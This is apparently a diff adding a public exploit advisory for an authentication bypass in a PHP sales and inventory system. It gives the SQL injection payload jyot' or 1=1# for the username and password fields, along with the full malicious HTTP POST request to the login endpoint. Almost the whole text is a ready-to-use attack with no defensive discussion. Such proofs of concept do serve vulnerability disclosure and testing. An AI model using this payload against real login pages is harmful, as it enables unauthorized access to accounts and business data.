@@ -1,0 +1,31 @@
+# Exploit Title: Simple Grocery Store Sales And Inventory System 1.0 - Authentication Bypass
+# Date: 24/09/2020
+# Exploit Author: Saurav Shukla & Jyotsna Adhana
+# Vendor Homepage: https://www.sourcecodester.com/php/14461/simple-grocery-store-sales-and-inventory-system-using-phpmysql-source-code.html
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/sales-inventory-system-using-php.zip
+# Version: 1.0
+# Tested On: Windows 10 Pro 10.0.18363 N/A Build 18363 + XAMPP V3.2.4
+
+
+Step 1: Open the URL http://localhost/sales_inventory/login.php
+
+Step 2: use payload jyot' or 1=1# in user and password field
+
+Malicious Request:::
+
+
+POST /sales_inventory/ajax.php?action=login HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 53
+Origin: http://localhost
+Connection: close
+Referer: http://localhost/sales_inventory/login.php
+Cookie: PHPSESSID=hdk9npcmq341ulcsn8cj6oefov
+
+username=jyot'+or+1%3d1%23&password=jyot'+or+1%3D1%23
